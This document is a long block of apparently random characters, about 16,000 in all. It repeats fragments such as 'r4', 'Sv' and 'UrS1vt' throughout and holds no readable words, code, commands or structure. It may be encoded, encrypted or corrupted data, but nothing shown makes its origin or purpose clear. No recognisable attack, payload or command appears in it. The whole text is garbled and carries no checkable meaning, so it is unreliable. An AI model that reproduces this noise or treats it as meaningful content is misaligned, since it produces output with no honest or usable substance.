r:>SS8r9 I0t4D8tr-1(ts1ID>1- v4Hr4SvS(D4 D0-4t(UUvt(Ur<D-Uv441cU>cU Sv( 8r-11tcS48Ir>1t8 (a14t1S>UW-Dv(o8I4>I-c84r>4cD8US8O%r44D4(U4>DvU cyUcvI -4IcS tr 16U411UDS(8UA-ScrD4DDr(t8>>1-c(A>3-v81=>IU.cI8Ur-(v-(>->v4(S4vD 18tvU4vD c4Dcv SrfD4U1D(t(Sv Ut St 4r11>!rIc>SSIv8e41ItISI8v>v- vf /-8>>-UvS8r4 D&-4c48v4UD-Uv-1 l44D1>>S8 Src1 t(c4c1r>4U>DSv88,n1rt1t-8U S4 > -(84iII>Dc-SSv I4)>r-1vD(UrcDv> S8(44ID>UtcSv>r 10DSc1 DrU1UtvS 8,r44-t>SU8SnvI > S4v^cUIt>S-vtI(pIr>1t>cU(S4tD Uvv4 I4>1>cFcv tr;4 U1c> UrSIIt Sc 4X81>t>SS8>4tI5>8S1v>eUI->v-8vz(  >>D-UvS v4 D(-4chSU4tDSUv>I ?4rD1>>SU Srt1 tvc4 Ir>I>SBSv8tRB4 t1S>8UKS4I> -c84(8I>>>-Sv>rt43D8-1S9(U4-DvU8c9  8>DDUUcS8>r 1(U4S%-Urt1StvDI8wrr11D>>I8SFtI >vS4c<0>rU t-vv-(_48>1tcvU8SrID Ucv4 (4>I/US-v8trp18U1cr UrD1v>v-I 4O 1>>4SS8vb 4 >rS1v(3UJv>v- vi 44->>-rvS(D4 D>-4c4 r4UD4Uvcv G44D1t1(4 SrI1 ttc4 1r>I>>>Sv81iK44t1S>8U(UIU> -D84(1I>>U-ScS(84WD>-1c (U4SDvtvSt(4rtD>tIcS vr I tbc18UrUr tvS 8*(24(t>--8S(II >ZS4v4IvIUDS-vcv(mI4>1U1( (SrcD tIv4(14>1>8Icv8vr%1vU1c> U)U1Dt -8 4.11>tUSS8v(4IP>cS1vInUIS>v- v(F44 >>-UvS(c4 ISU v1(r4U((Uvc8 n(ID1U4>S -rv1 4Dc4 Ir>4UIDSv8UyVI t1t88U Src>8-S84( I>>D-ScS D4<Dc-1cI(U4SDv> SD(4r8D>UrcS 4r I >Dc18 rUIvtvS 8d(7Ivt>-(8S( I >5S4v4{rIUDb-vv4(RI4>1->ct(S4DD U>v4(44>D4c8cv Ur!rSU1cD UrI1vtS>4 rr11>IzSS8c+ Iv41SI8>%U8(>v-8vu 4 (>>-4vS(U4 It-4S1Sr4UD1UvcU NrcD1t1S- SrD1 D>c4 1r>4UtDSv8t7+Ict1-c8U S4v> --84(8I>1 -SSv(I47Dc-1c((UiDDv> c((4r8D>UrcSvIr 4Lt1c18(rU1ItvSt8#r4 >tDS48Sg>I >-S4c1vrIU>1-vvU(iuS>1>7-U(-4>D IDv4(I4>IvUScU-Tr(D4U1Dc Ur-1v>vII 4m 1>t1SS8va I^4cSIv;PUI->v-8vY k4v>>-4vS >4 D/-4S1 c4UDIUvcS x(-D1>>c4 SrD1 t-c4c>r>1U>8Sv8>N914t1S>8UgSIS> --84(8I>D9-Svv 84KDv-1v1(U4-Dvtvt8(rr D>>tcS vr 1g>>c18orU1-tvSv8:(4I-t>S48SA>I 18S4c1(IIU>1-vvU(Jr1>1Ujc1(S4>D IDv4(I4>DUUScU-/r(D4U1Dc Ur-1v>vII 4h 1>>rSS8v9 r!48S1viWUI1>vt(vk8vII>>-4vSSD4 D(-4-D(>417vUcc  RvcD1UDcU >v 18t*c4U-r>1ttSUv--P+Ivt1S48U(>Iv1 Dc84( I>>4-SSD( lSv>-1cA(U >DvU8cCvF41D4ISc- vr FvU4cI >r4IUtvS 8RhU11tDSU8U=vIS44Sr81J>4 >S-cv (:vS>1->vU(-4vD U%v4(14>DUUScc  r0D4U1cr UrS1v; 18UrSU8St1SS8vP 4 (DS18>;UI->v- vZ(h(v>>-tvS(v4 D!-4v1 S4UDSUvcv f4rD1U>1H Srv1 t(c4 1r>1Ut-Sv8 A)4rt1S>8UCSIc> -u84(cI>Dk-Svv( 82(I4rD8U1vr 8r/c818 Drr>-t8(c r7hU4Sc >rU1S4(18t-S18cu4IIt>StIc>bS481Y>IU>SSvp((s4c>1->vUc>vt crv16UDS8DUUDcv  rY((r1DDtrSv1vtDS* 4r1BIGL1->SS888( I(>1bUII>v- vNc4vUBDr(>DUSccD)UUv1(>4UrI4t1S-8c8 4T71(Utct1 t1c4 1r>(rr-1I>SvS8I!4>I>CSrvEAS-/v-M1I>>U1FD8-1vr<c4DD1Uvv>DvU8co(4411vUUSc vr 1br DIt4ct(Urt1rtr- 8(IrI4tD- vS>,-t81P>IUr 48>c-(v>r14S>tUrvt vU8v4(14>DUUS1vDt8b1(U1c> UrS1vt SHS4r11ItUSS8v-X8c(cS1v>iUIS>vD>Dc-D8I(U4->r-U8v(r4I1FS>vt UrUc   44D1U>>1-Sr-1 tQc4 1r>1UtSSv8 ZD14t1S>-DS48c(sI->8crv>/t4ID ( 4v>4-1v>-rv- (4-cB U41D>UUtUtScD vrc1(-UcI8>1SS 8Sr411t>II>v-v88R8It81(vIU>S-vUU-tcP((1I>IUUc>(-r v4 I4>DUUS>SU-S! >rcDIUtS> trSD8> SD81rt1IttGcIit4S18>^UIStvD(vp(vI1>>-UUtc>cv((4DD((I48SvU1c#I-r1(>v>cU >rv1 tu>St(cD 1ttUc(184144I8>4>vSIv>--&84N1(r(4IDD USv>>4-1v> >S8DvU cy8D41D>UU-SStr 1gU4c1 >i>1S>S U8Crr11D>SU8SCv4v>IS484a>ID>S-vv   r >1-IvU8v4vD UCS}8 4>D1USSt  rhD4t4S8 UrD1v>-Sy 4r1I1trSS8>N 41t4S18>(>IU>v-tvL 8I1>>-UcU-(48DU-4SU(>4UDStScv nr-D1trcU SrvIv>1c48Sr>1ItSSv8 ( 4-t1-c8U(DIv> -sc0*rI>Dv-Sct( 4p>4-1S9(U4SDvU4cg k41I>IIcS cr 1uU4c4 >g>I>tvSv86(c11t>SUcS(tI > S484l>4(>Stvv4(#4=>1-1vU c4vI tIv4(44>D>USc1  (h1JU1c1 UrU1v>cS/v4?41>t>SS8Sh I t4S1tUltI->v-8vu(/I11>DIvS(c4 D(-4cj(>rSrdUvS  YLtD1UDcU -rv1SI4cr 1r>48tSSc8 .v(1tIS>8US1Iv>8-9c,UtI>>t-ScD( 4W>4t1IU(U4-DvU8cG -41I>t(cS cr 1(U4SD >(UI8tvS88Jrr11> SUcS(SI >(S48I^>4D>SUSvc(;4b>1t-vU(S4vI U1v4(44>D>USSS  g ItU1cI U(S1vt Suv}1 1>t1SS8-0 I)t4-4c *UID>vtGvK*4I1D1U>vS(>4 1c-4v1(>r>1 Uvct l,8D1U>cU8U_-1 tUc4vUr>1UtS-S8S%6I-t1-r8UwSIvDvU-84(SI>1v-Svv( r -U-1cc(UrDDvU c68PDSD>tvcS tr 1}U4S4YcrUI8tv--8br411>1-c8S( I DcS481J>IUDU-vvv(741>1-1vU S4tD U(v48t4>D>UScv8-rMDrU1c> Ur-1vt S4 4r41>tUSS8Sm IBDDS18IuUIS>v-vvo84(U>D-DvS8c4 1S-4-1c 4tDtUvct hr>D1t>-  SrS1 >1c4 rr>rU>-Sv8v_NIrt1--8U(S4t> -(84 UI>>>-ScS (4LDE-1S((U4SDv> c1(444D>U>cS 4r I tcc1 4rU4(tvS 8<r41ct>S>8SOUI > S4c1(-IU>U-vvv(;4t>1U1> (S4UD tUv4(14>DU>(cv vrm1 U1c1 U(SI<t S  4r41>>8SSvS?8IW> S1vUaUIS>v- v-H4I4>>-1vS(S4 Ift8v1(14UDUUvS1 x9L1vU>c1 S&I1 tuc4 1431UtDSv88_b14t1S>8I7SIU> -c84V1I>>UU(vv(v4f>4-1vD(U4SDrU c (441D>UtcS vrU1Zt(c1 >rU1UtvS 84r4I/t>SU8SpSI IEU881O4IU1--vcU(zB44v-Dv1(S4DD U1v4 1rvDUUtcv84rM1 U1U>8>rS1-t -( 4rI1>>U-r8vzvI/D>S18IpU4U1(- v8B4r8>>-UvS8vrvDLU(v1(I4U1+UvSv 8441(U>-8 Srv1 tsc- 1rI1UtDSv8v7M44DyS>8D^SI-> -D84(48v>U-Dvv >4T>4-1v> u4SD-U cc(444D>>US1 vrc1%t(c18crUIUt1S 8cr4I>t>SU8SfvIc>_-(81ZrIU>U-vS (UI4>r->vD(Sr4D t cS(14rDUtrcv  r*D4SSc> 4rS1St S* 4r1>4tUSD8v;UIyt4S18>(>IS>-- vmb4II>>U>cU(v4cDZtcv1(>4UISt(c  844DrU>S( S(vI1t_S( 1rI1U>cSvc (>14trS>8DuSI1> tsvrV1II>U-tvv8(4&14U1v>(D4SD-U cS(4411SUUct vrv1,Urc1 4vS1-tvS ttr41It>->D8EvI8>QU 81?>IU>Sv4v ( I4>1->vU(S4vD4UZvr(141DUU-cv  cUD4U1c> trS1vt Sj 4r11>tUS48vR Iit4-18>WUIS4c4-Dv-Ir1r;ItDUU(2 r 4IDrUIvI tUvcS =44D1,(DtUrSU1 t-c4 1r> rrDIUttSc81( S>8>uSIv> 1rUck14->U-SvvScvc(>4(>IU1sSrSr(18t(c( IUUcD vr 1pr4DrUDSv8 tvS18yr411I1Ivt-S-8I1)D(>4-tvr>S->v (KI44r4tDS-1vI(tt-v4(14>1>T8cv  r/1AU1c> UrSUIt ST 4rI1>t>SS8>4tINt4S18rGUI->v-8v.(  >>D-UvS(t4 D(-4cTSU4tDSUvSU G4rD1t1Ic Srv1 t8c4 1r>1UcrSv8 &n1rt1S18U S(t> -T84X1I>Df-SSvc-4!>4-1v>(U4-DvUU8-(441D>tvcS cr 1(U4SN-Urt1StvS48brr11t4DS8-_vI >KS48IJ>4> 8-vv (/4 >1->vU8S tD UJv4(14>DIUS-> 8rlD4U1SD Ur-1vttS*8 v>1DtUSSvc= I(t4-uUUotIS>v- vjyrI1D1rcvS(v4 DS-4v1(>44IrUcc8 s44D1UDcU -rv1 vUc4 1r>1UtSSv8 B2I>t1S>8UYUIv>8-ev c>ID>U-Svv( 4(>4-1D (U4SDvU8cz(441D>UtcS vr ruU4c1 >rD1StvS 8/r411t>>U8S.-I >5S4>>Srvr>S-tv (3I4d;48D1U vtD U>v4(14>r>r DcUccDI41r11t-SI1vtDSF 4r1v(A-IUtr-cvZrr1rtrJD--rSDcSlv-c8tU8-vS(t4 DN-4ttUtv1(DrQccv4tSIKS>DUD>1-.(t8-c1Dr1 US (rIUvT14>1S>8UFS(c(-4v>I 1 f_t4UD(8   (I4rDI-IctDvUUc{(441rI141UUccr cU4cr >rU1SIIIc-(r4I8t>SU8Scv84Z(4->(-1vD>tI?8 AJ8I(Sc44>cv4vDDUQv4(18-(t4I1 UDSv88rMDr D(c1t>I1ag8ScS ISStS >>4v-41114IDtc>v-Dvyx4I1r II>-U;cS(U1P>IU14UD>Uvc  <8D(Ir81S t U8U1Sr4v4D4SrcvSv8tA_14t1I(tI->8DQ-I4DvB1I1>U-Svv-( ->4U-v>(U4SrD4-1vS(cv 8rvD>tSc- 4U4S( >rU1SOv18tt-g8rt>S18S/vI .-1r>tSrIDSF>Ic Igv-ts(1.S(t4vD UYv4(14>1U1Scv Ur/D4U1DtU-v8 crD14 4r41>tUSSUUc IA>1S18>bU(1lI4W>vcvvc(14DD>c-v>(t4>Dl(>44DSUvc S8c> c4r1St>r-(D841DS18v48Ic>v8 QI14t1S>UDSDvWL-I8D  1(1(-4tD---c8D(-1v>(U4SDvI Ivc44r-t1D>-1v((Iv8t(1 IrU1StvS 89r4D1ItSU8>xvI >P1 >(U v1>S-Dv (XI4r(4U>t-UcG(-4vv4 14>DUUSt1t-cI(rr>1tt(c>(SB(1r> v1 Dz>I>8vTtIgt4S1tHSI8t(U4(D v(I1DN-UvS(v c(r41D U8vrD-Uvc  D44D1U>>vtcc- 8r1>4tUcDv(rDIS8 !U14t1S>UU-cv-&D4v>--DvU>U-rvv( 4VKIIDUrUSvD (4DDct(4118UUcS v8c U4r14UDcD8>rtIv8+w 11t>SUUtSIv10cS4v{,>IU>S4D>8-tc 21->vU(SrSvtUTv4(1s DUUScv8vF-D4UIc>v(rS1vt U# rr11DtUS-8v*-I_D4-r8>{tIS>c- c1<4r11c-Uv-(v48D<>Dv18>+ DSUcc  (44IDU>-U 1rv18twcr 1((1UtSU18 L(14t4S>8U7SIvDI-+8461I>>U-Uvv(S 4>r-1v>-c4SDcU -o 441DrUUc> vr41_>B S >rr1StDS 8ur411D8SU8DZvIt>e-;81(!Dr>S-tv  hI4>I->vt(S4U?2U(v4(1r>DUU-cv S84DrU1c>UcrS1ct U<84r11rtUS>8v /IWDa8S8>prISDS- vPT4I118-UvD(v4tDPUZv1 51(DSUtc -I44DIU>cU SrU({t(c4 1c-1Ut-Svc vc14>(S>81_S4S> tM1(,1Ir>U-Dvv c4W14Urv>(I4SDtU c8(4K11IUUcD vr-1zD8c181r41St>S vIr411t>->v1+vIt>G-t81j>IU1S-Uv (-I4D8->v>(SrS1tU_cS(1}IDUUScv8vDSD4tcc>vUrS1vt - vYr1IvtUSr8vA IjDzU(8>(8IS>>- v^z444D>-Uc (vrSD}-4v1 14DDSt(c  U44D1U>S>8(rvIYtH-U 1r>1U>USI8 zr141oS>8U_S4SS1-+v4914U>U-Svv v>>>4UIv> t4SDvU S Ic4111UUSS vr 1L>Z-S >FD1St>S 8Ar411>SSU8I5v4c>GS481u>rc>S->v (2I4>I->S4 44vD-Uf>D(14DDUU>cv S84DrU1c>UcrS1ct Uu-8r1I:tUS>8v tIoD4UI8Dp4IS>>- SrF444Dc-UvI(vV>D,-4v18>rcDSUDc  -44D4U>S>8 rv1>tB-t 1r>1U>USD8 Pt14D-S>8UdS4S>I-5vUz1ID>U-Svv( rD>4U8v>  4SDSU cS4D411&UUUI vr817tcc1 4vS1-tvS S-r41It>S1Uv=cI >!1D81eDIU1SDtv (SI4DA->Sr(SuvO-UHcv(1rKDUD cv8vrrD4t8c>v(rS1vt U)v(r1I(tUSI8vprIzD4- 8>2rIS>D- SDM4r11 -UvI(v4tDp>1v18>rDDSUDc  -4448U>-U8Urv1tt:Sc 1 S1UtS1 88oS14> S>8ruSrv4--!vvT14a>UUcvv8UII>4U v>c14SDcU - (4r9bUUtcS v8S1GUrc1 4vS1-tvS UIr41It>->D8uvIU>dt481/>IU>SDDv8(SI4>I->vt(SrS14UFcv(1V-DUUScvv r8D4t8c> 1rS4Dt UB8Ir1I(tUSI8vHII?t4-I8>(!IS>v- vMJ4I1Dv-UvI(v4tD?USv1(>r8DSU>c   44DIU>S>crrv1Ut_-8 1r>1UtSSr8 <S14tIS>8>,Srv>c-;vvK14_>Utrvv8 rS>4U v>(44SD4U cS I411AUU>t vr81yUrc1 4vS1-tvS U8r41It>S1Uv;cI >_1D81GDIUDUr(v (SI41 ->vU(S.vr-U+cv(1rNDU>-cvvUr(D4t c>UzrS1ct Sv 4yd(UttSS8vc>I*trS184cSI->v- tIO4II>>tUUD(v4UD:U v1 14UIS1tc  S441 U>-4 S(>18tOSv 1c-1Ut-Svc1i:I 4>SD8UsS8(> -(84(z U>t-SvvcS4}>r-1c} >4SDvU c>(44ID>U>cS Uv_1(U4c18vrU1-tvS tUr411t>St8SfvI >RS481G>IU>4-vv (sI4Di->vU(ScD(84t1 (1rRDUUScvSccr 1r 18UrrS1St Se 4cD((tUSr8vj IpIr4(>4--rS4>I8D -DI1D(-UvS(vvt(cr D8-rcS 1UvS! <44D1IIDIt ct cAv-4-tSt8SYtIUt-- 14trS>8UjS(IGII(84((I>>U-SDv-cv((>4US((U4SDvtv1I(441D>UtcS vr 1dc-c1 >rU1-tvSv8__vD8t>SU8S&tI >(S48I:>I1rv-cv (x48>1-DvU(>8 D8UWv48 4>DtUSSStrrED4U1cr UrS1vt  t 4r11>ttSS8S* rk48S18>HUIS>v-vvj 4 (>>-UvS(v4 Dv-4c N(4UDSUvc4 ,4rD1UDcU >v 18tVc48Ur>1ttSSUUVX(14t1S>8U/-IvDv4I84!1I>>D-Svv( =Kr8-1v>(U4SDvUUcfvv4ID>UUcS8cr 1(U4S8 >r1(vtcS 8g%r11tDSU8>c I8>aS481G>It>SUSDr(9I4>1U vU(S4vDU>tvr(I4>DUUScc  r(D4U1(  UrS1vt S. 4r11>>vSS8vJ I t4SI8>.1 v>c- v*P4I1>D-UvS-14 Dg-4vI(>4UDSUvc8 F44D1DtcU Srv1 t8c4 1r>((B(1c8 F-14t1S>UU- 8c(DIcDY-rI>D(-Svv(  ( 8r7Dt8U 1(crvDI(4r(D>UUcS-UcD8vr>1( >r>1StvS Urvc1r4 4-#-U8P=-2N1->9>ID>S-vv ctc(4I->cF(S4vD IlDIUrc8 14r18tWr8->>4c f-tUtSv- K 49 1>tUSSt8S((IrrIc>UdU4(>v- v%c>vD_IItD Svv4((r-D(U14DDSUvc  n443104tU Sr>1 tRc4SrSS8(rDI >S6OI t1S>8USI8cmrIc84(>I>>U-St---v1(8IrD48U88 8rh18t c( 1UUcr vr 1YI(1vUDS> -r-IStc-}11>>SU8S<v(>(cIDtI-Uv-zrIUtv-rvI 51>>tUUcUDc 4Dc-rS>c-rUtcS r:1 U1c> Uv8 crD14 4wc1>tUSS>D-(v ftIr>>St8t6t- vco4I1>>1cDc-Uv-(1-4c8(>4UDS1t1HU(c{ U4rD1 tI4 DvrcI8hI1S>IvS-Stt4tD(DDt1(rct8> -D8401I>4rIDDUccvU(-4U>4U>vD  UccP(441D>UUcS(v8(1Gtic1 >rU(>4vS 8Sr411t>>D>c- 8UptIc8rer>DUt-8v-r UuS>-IvU(S4vD U/v4(1 >DUUrcv  rW(I4DtrtScD8(rD1c>(r1I8tUSS8vvr8(RcI>>8-1vDCUI-v9( I1>>-UDI-cvD v-4c((>4UDSrvD8UtS+ rUIUr1v1(v(Ir4-(D8t1UtrSv8 *J(SV(1D>v->814vI(DyQrcSrFS4  -(cD(>D1v>(D4SDvU D4U8S8DDUUcS Ur 1LU4>rt8-  DtvSS8hr411441I>4-UIc41 SS-S>DU-c(tUb(y41>1->vUc1vI ^4vtvUcc1 Dr>t-U>ct >r^c> rrS1vt 1-t8-J8(rIIv>>j I-t4S18>c48Da-4S>rU;Tr>>-4vS(v4 r81vD4-Dcc(DU-v1vU1ccDvv{I4DD8 (t?c4 1*1crtSSv8   14t1S>v>Y-Iv>8-bv1K1I>>UtScr( 4(>4-Iv> 14SIvUDcE(r41DDUUSd v( I(U4cI >rt1SD8S c*bS11tDSU8-hvIr>EU4cS6>It>S-cv  tI4>1> vU(-4vDvUEv4(14>I8UScv  rdD4U4c> 1vv1ct ShU>r11DtUUSvvf Ict4-98>HrISDS81vA(cI1Dr-UvS(v4 1t-4c((>4rDSUSc  SIcD1UrcU8Srv18t<cr 1r4(St-Sv8 (+14tIS>81cvIc> -,t>m1ID>UtScv( 4c>4U;v>v84S1Sv1cX c41I4UUcS vr ItU4S( >rr1StSS 8S4c11trSUv1nvI8>/Sr81Q4 S>--vv  SI4>I->v1Sv4cD UC>>(14DDU>Stt  rcD4t}c>v1rS4v(cS/88r11rtU-t8v  I>t4-(8>/IIS>U- S.(II1>r-UvD(vKDD#tlc-(>44DStrc  s4414t1cU IrvrLt0c4 1(>I>tSSD8 j-141 S>v> (Iv>>-=S8K1I>>UUUk>( 4t>4U4v>(U4S1SUIcg U4118UUcS v/v1 U4S- > -1StvS v s 11>SSU81NvI >YUPctg>4c>SU1v (yI4D4UUvU v4v1rU^v4(1r1IvUSS8  n>D4U1c>8>1L1v> Syvcr11>tU-Ur4^ 4(t4Ur8>OUISDS tvO ?I1Iv-UvS(vrvDD-4cr(>(-DSUvc  urcD1t(cU8trv1 tAc48Sr>14tSSv8 *(141 U-8UkDIvr4-Y8rW1ID>U->t (84Z>4IUv>(t4SIv1-cw v41D4UUS- v( 4(UrS  >r41SD1S v {S11>(SUS8bvI >3U4v :>Ir>S-Dv 8SI4D4U>vU(44vIGUJv4(1r1IcUScI  n4D4U1c>8>rI1vt1S9vUr11>tUSS8cj I-t4-S8>?>IS>>1vv((vI1eS-Uv-(v4tDoU t>(D4UDS4zc  (44I11rcU 1rv1StBSr 1(>(ItSS>8 xS14>vS>v>}-Iv>t-nv1!1I>>UtSc(( 4->4U8v>(>4SIvtvc6 c411(UUS( v( 1SU4S8 >rr1S>vS cEEI11>(SU8IQv48>uU484_>Ir>S-Dv (UI4>1IUvt(14vDUU&cc(1+>rIUSc>  rSD4>1c>v4r81vtUS_- r11DtU- 8vZS(4trS18>v1IS>c- vvc1II>>-U> (v48D,ts1t(>44DS>cc  ?44D1I(ct 1rv18t)cr 1p114tSS>8 (D14t1S>cUl1Iv>t-%v w14D>UtSvr( 4->4U8v>vS4SDvU>cT S41D>UUcS vr 1cU4S8 >rr1St1S 8dJl11>0SU8UEvI8>}U2-cn>I4>S>av (QI4>1U8vU(14vD8UYcg(1:>1cUSc>  rSD4>Uc>vU=c1vtUS?8vr11ItUS18Ub ISt4Dr8>otIS>c- vvc1II>>-Utt(v48DBU t>(D4UDS4Oc  (4414k-cU 1rv1-tac4 1(>iItSS>8 %S14>DS>c4N-Iv>U-!tSe1ID>U--vv(S 4>r-1v>-<4SDcU cvS14ID>UUD  vr810>4>( >r41StUS cvr441IrSU81fvIU>:Uv818e-v>S->v cvI4>I->Sr(S4U*jU(v4(1 4DUU-cv UE D4U1c>8 rS1ct S  47l(UttSS8v=1IWtrS18>-;IS>v- v(P4I1>>-UvS(v4 DeUSv1(>4UDSUDc  z44 84r11UIct8OnSc488r>1UtSD->(Sr81nbIt>-;SIU> -T84U88D((4>vv(r40>4-1tI-Ic (t4c1v84 4 trD1tUtSc1Yt4c1 >rU2-KtIStr(4( rDI>>8 v(vdr4(>rSrvD>S-Sv (*I4yD1(vU(14vD Uyt(UDcU(44rDD  rcD4U1c>tUct cr411vvr11>tU-UD(! ILt4Sr8>gUIS>v8Dva,4I1>D-UvU(v4Ut--4v1(>4IDSUcc  (4412IUct Srv1-t9cr 1r4(St-Sv8 (c14tIS>v>U8Iv> -z8rf1I>>U-SFI( 42>4-Iv>(>4SIv1-cJ(441D>UUcI v( ^cU4c1 >rU1SttS 8SI-11t>SU8SLvI8>PS481!4 S>--vv (BI4>I->c>t84vD U;cv(14>DU>Stt  r9D4U1c> 1rS4>t8S; 4r1I>tUS-8vBvIW> D>8DsUISDv- v(n44erU-tvS(v4 DT-rv1 1ScDSUvc  U44D1U>c4vrrc18t;c4 1rD1Ut-Sv8 DU14t1S>8U&SIv> -,v>F1I>>U-Uvv(84GD 1>vD(U4SDvU c((441  UUcS vr81xU4c1 >rt1StvS Sdr411t>SDIt 8cv4.(t1r> tS>ttR->8UD4I(I (Dcc4vDcUav4(188 D1-cv UruD4U1tIt-Sv >rD1- 4Bc1>tUSSU(S88-J1Ic>4-I8>9t-cS 8Svth>ItcDcu  D8-4v1(>4UDSUvc Sw44DrU>cU SS  -+-c48tr>1UtSD-t-S188rrI4cUvUv8(c48>8-rII>zr8(-8(ScU4(4RU(U4UDvU cM- 81DIUUcS vr 1YU4S1S>rU1rtvS 8,vS8(rDIv>>S1(vg(4=8r ct -rt84>1(8rS1->c8(S4vD 11DI-rvD vIS1sU8St 8r4c>8UrS1vt >(>8-%8tDU>1tc-v8ID4>4>t-Dvtut4cvR(cI1>>-UtSUzv8 t48D4UI4UD>Uvc  kv( c*vDI Srt1 tpc4t1cD8(OUI-8 3-14t1S>trSDvUdtIc>1U ID>U-tcv881D>Ic(1>nS>cD-U cB(441D>IUI>Svr 1tU4c1 >c- cItI2tcSD8crrID8SVII >hS4D8-tv>((4-D -(v(((->vI(S4vD 1IDIU&vr vUScI  r7D41r1 UtSU crcIvt8S41>>8SS8vp (-F840-I-E8r(;ISD -8v>>Ic>4Ur>4(Iv8(r8IU4UD1Uvc  ?vI(DI-DtUrS 1 t c4 1r> -IIS-D8t88D-1-U(--I(v> -S84L1I>4D4 >I--v4  -1cU(U4SDv1UDtU1caL5r(1Ut-SSB8rS1ctSc11ttvS 8^r411t>cU-cPvI>>)S481c>v-(tIIDS-tvI(>-ID>vSrD8 Mc 4D4>UDUU>cv  r?( r(I t1rS1Ut Sg 4S8 DHc1D8vytIOt4S1-r-S8-eSI4>c- I1>4-UvS(v r((4-D>(>44DSUvc S88v 44D1cUDr-I41UUSw1(r fSt 88 Y-14t1S>U4SD8-(SIrD68rI>>r-Svv( 88(I4DDU-1cc 8U S6(441D>I,1Dt(c8 4rI1cU4v>8c^8ISUWcr84^4SU8DVvI >p1 >c-4vv}D-vvS(QI4>1r(>t-rcU(+UVv4(1r1vrUScv  =8D4U1c>8>*D1vt8S%ccr11>tUUSvQ< I(t4SI8> (IS1vU8v0MrI1>D-USv(v) 1c-4vI(>4tDSt1c vP_SD1UDcU -rv48tL-48tr>1ttSSc8 (114t1t 8UR-Iv>v-B84<1I>18-Svv( 4!>4-4v>(18vDcU c9-t41DDUU-S8vr 1cU4Sw >rD1S>S 18s.c11DvSU8S7vI DtS4v(a>Ir>S-Sv (SD->1-rvU-(4vD8ULv4(144nSU-cv  vDD4UIc>vU<S1vt-S+8 r141tU-Ur4! I-t4-t8>}UIS>vUDv!(8I1D(-UvU(v4Ut--4c((>rIDSUcc  (441nIUct SrvI-tOcr 1r4(St-Sv8 cD14tIS>cUvDIv>--*v 914->UtS1-( 4c>4U(v>v(4SIvt1c6 841DrUUUc v( 1rU4S( >rI1SD>S v (U11>3SUv(}vI >mU+vc_>Ir>St4v (HI411tcvU(I4vDtUwcS(1r11tUSc1  (QD4U1c>8>D11vtDSE8vr11>tU-U8>, I>t4->8>zUISDS->vJ(tI11P-UvS(vrv1I-4cU(>4tDSUvc 8 rID1t-cU Urv1 t9-Y84r>IStSS48 0G14>4U(8U(cIv1c-784G141- -Scv( Tc>4-1v> >DNDvt8czvt41D>UUSUIDr I U4-t >rU1S>S-a8O((11D=SU8SXvI DcS4v8o>4D>S-vv (w4U>1U.vU(S4vD8UT-v t4>DIUS>r  r(D4Dtc> 1vv1ct S2Utr11DtUUS-t) ISt4-W8>8SIS1vt8v((vI1Dn-UcU(vrv1(-4c8(>(vDSUvc vX5cD1t(cU Irv1>tx-s8Dr>IntS-!8 =B14>4Uv8U}rIv>4-H843141Dn-Sv4( 4->4-1v>(UrvDvUtcg U41D1UUc1r(r 1SU4t8 >rt1StDS 8vv11It>SUSIVvI8>W- U>!DIU>S1rv ((I411DrvU(14vDSU&-1(1Q>sIUSc>  rSD4DXc>8>rD1vttSbccr11>tUUSvDM I-t4-88>(tIS1vUGv{(cI1D(-Ucc(v# 1(-4c8(>4rDStrc v9nUD1t(cU Irvr;tT-48 r>1rtSSD8  v14t11U8t,1Iv>U-<vcP1r>4I-Sv>( 4S>4U(v>8448DvUUceS 41DDUUSI vrSe4Urc1 >811StcS 8vv11It>SUt(RvI8>EUCDtg>I4>S>vv (MI4>11(vt(14vD8U/vr(1r1IZUSc>  rDD4U1c>vU2 1vttSE8 r1rUtUUSvc^ I-t4-88>8 IS>v->vT(SI1>>-UvS(v4 D8-4c8(>4rDSU1c  YrtD1tbcU Urv18tP-NSrrD14tS-U8 lV14t1-Z8UK1Iv>8-+v2<1r>>D-Sv>( 4S>4UTv>8Ur8DvUUcR v411>UUc18nr 1SU4D- >rt1StvS 8vv11It>SUt(dvI8>bU=Dtk>I4>St8v (#I411DrvU(14vDUUZc-(1(KDtUSc>  v-D4UIc>ccrS1U4hS( 4r1 (tUS-8vuS(4trS18>S8IS>c- Slc8I1D;-Uv>(v4rD9t4t((>44DSU>c vU444  ScU 1rvKStNcr 1Yr1Ut>D 882x144gS>8t/SI>Dv-R84R14v>U--vv(v4?D 1>vD(U4SD4U c((441  UUcS vr81*U4c1 >rU1StvS 8cr411t>SUv-svI >h>rD(-4v-1SD4D(-tv111D4DIUvvD(-4rD1(1rsDUUScvSccr 1r 18UrrS1>t Ss 4vtv84S1->(S-I,>cS18>xU8Iwt4S>--8v> L-Ucv(v4 D,I8D1-4vt >4tD(-8c88lr41(tvcD11t*c4 1Q1 4t-Sc8 Tv14t1S>8U^DIv>8-&8rL1I1>UtSc(( 4(>4-Iv>(>4S1vUvcy(r41DDUUcS v#v11U4cI >rI1StvS v kI11t1SU8>kvI >sS4vtM>I>>S-cv ( I411DrvU(U4vDvUec((14>1vUScc  r D4UIc> Uc41vt Se rr11>tUS-8v# I6t4- 8>^UIS>v-vvBV4I1CtDrvS(D4 D0-4D8-rc1(I4t1<tS441 U>cU Sv(8DI4Drttcr1U>vSv8 HO 8J114tt->8t,(18>8UAv4((4v>D( 4S>4-1v>cDcc  4UDtUc411UUUcS vvc cr>1(UIS14S4(I(t4-(vsrrI>v HvI >{U3DtN>It>S-cv (2I4D141vU(-4vDUU*v4(1r1(4U-cc  r D4U1c> UrU1vt8SV rr111tUUSvrf I(t4SI8>2IISDvU1vgJrI1D!-UvS(vrvD4-4vI(>41DSUvc 8 B(D1U1cU Urv1 tLc4v8r>1>tSSc8 j 14D1>r8UPUIv>v-Hv(F1I>Dv-Svc( 4 >4-Iv>(Uv4DvU cy(r41D>UUc- vr 1pU4Sv >rU1StvSt8mr411{(1I>>SD8-F44v81E4IU>S-vDt-(v- _->v4(S4vD 18DIU>ca (4Ic-  rp.1> U8cSI8=St Sv 4r11>rr1->(S-I,D-S18>kU(-(t4S>r 4  )D4>D88vv4(44vD(U1cS(-r{- S8vr rr41vUDrv1tt)c4 1v>8vr-1-t-vt8 t1Sr8UxSIv( I8tr-UvSDI-Svv( r  D-1v>(U4UDvU cs(4DcD>UUcS cr 1 U4S o8rU1Stv-S8Arr11t>SU8>c I8>NS4cjR>It>SUSDr(XI4>1-DvU(S4vD vtv4(14>DtUScS  (5O8U1c> UrS1vtcSyv4v(1>tUSS8v{ ISt4- (8,UIS>v- vYNrI1>>-Uv>S 